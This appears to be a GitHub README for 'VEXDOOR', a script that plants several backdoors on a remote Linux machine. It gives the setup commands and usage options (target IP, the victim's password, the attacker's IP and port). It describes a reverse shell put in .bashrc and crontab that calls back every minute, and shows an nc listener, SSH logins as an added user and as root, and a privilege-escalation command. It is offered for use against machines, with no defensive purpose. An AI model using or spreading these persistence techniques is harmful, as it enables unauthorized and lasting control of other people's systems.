# VEXDOOR

vexdoor is a script created by vex that create a multi backdoors on one linux machine

## Installation

first you need to git the directory

```bash
git clone https://github.com/V33-777/VEXDOOR
```

after that you need to create a ssh public key using this command
```bash
ssh-keygen -t rsa -b 4096
```

now you need to move the public key to vexdoor directory

## SETUP

```bash
chmod +x Requirements.sh
chmod +x vexdoor
./vexdoor
```
atfer that you need just to use -h option to understand how it works:
```bash
VVVVVVVV           VVVVVVVV 333333333333333   XXXXXXX       XXXXXXX      
V::::::V           V::::::V3:::::::::::::::33 X:::::X       X:::::X      
V::::::V           V::::::V3::::::33333::::::3X:::::X       X:::::X      
V::::::V           V::::::V3333333     3:::::3X::::::X     X::::::X      
 V:::::V           V:::::V             3:::::3XXX:::::X   X:::::XXX      
  V:::::V         V:::::V              3:::::3   X:::::X X:::::X         
   V:::::V       V:::::V       33333333:::::3     X:::::X:::::X          
    V:::::V     V:::::V        3:::::::::::3       X:::::::::X           
     V:::::V   V:::::V         33333333:::::3      X:::::::::X         github:https://github.com/V3X-777     
      V:::::V V:::::V                  3:::::3    X:::::X:::::X          discord:s3cdet17
       V:::::V:::::V                   3:::::3   X:::::X X:::::X         
        V:::::::::V                    3:::::3XXX:::::X   X:::::XXX      
         V:::::::V         3333333     3:::::3X::::::X     X::::::X      
          V:::::V          3::::::33333::::::3X:::::X       X:::::X      
           V:::V           3:::::::::::::::33 X:::::X       X:::::X      
            VVV             333333333333333   XXXXXXX       XXXXXXX      
Backdoor Setup Script
---------------------
This script is created by V3X to create multi-backdoors on a remote machine.

Usage: ./try.sh -u <machine_username> -p <password> -U <your_username> -i <target_ip> -I <ip_user> -P <port> -k <public_key>
Options:
  -u <target_username>      : Remote machine username
  -P <password>              : Password for remote machine
  -U <your_username>         : Your username
  -I <your_ip>               : Your IP address
  -i <ip_target>               : IP target
  -p <port>                  : Port number
  -k <public_key>            : Path to SSH public key file

```
# USAGE
waiting to receive your revshell cuz i put your revshell in the .bashrc and in crontab so after 1 min you will receive it
```bash
[vex👽>  ]$ nc -lnvp "your port"
```
you can connect to the ssh with your user that you put it in the first 
```bash
[vex👽>  ]$ ssh username@ip
```
there is another trick if you find a way to entre to the machine you can high your privilege with this command
```bash
[vex👽>  ]$ vshell
```
you can login to the ssh by your id_rsa 
```bash
[vex👽>  ]$ ssh -i id_rsa root@ip
